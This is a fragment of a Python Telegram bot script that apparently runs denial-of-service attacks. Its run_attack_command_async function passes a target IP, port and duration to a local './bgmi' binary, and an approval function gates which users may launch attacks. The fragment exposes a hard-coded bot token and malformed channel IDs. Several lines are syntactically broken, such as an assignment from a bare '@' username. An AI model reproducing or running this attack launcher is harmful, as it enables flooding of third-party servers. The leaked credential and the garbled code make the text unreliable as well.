...
TOKEN = 7330573277:AAFAgqwev-w8uNEfEUDRxvdB2akzE2X19dY
...
FORWARD_CHANNEL_ID = 6242001595,1960605413,196060541
CHANNEL_ID = 6242001595,1960605413,196060541
error_channel_id = -6242001595,1960605413,196060541
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 5000")
...
def approve_or_disapprove_user(message):
    user_id =@Shubhamraj90
    chat_id =@Shubhamraj90
    is_admin = is_user_admin(@Shubhamraj90 CHANNEL_ID)
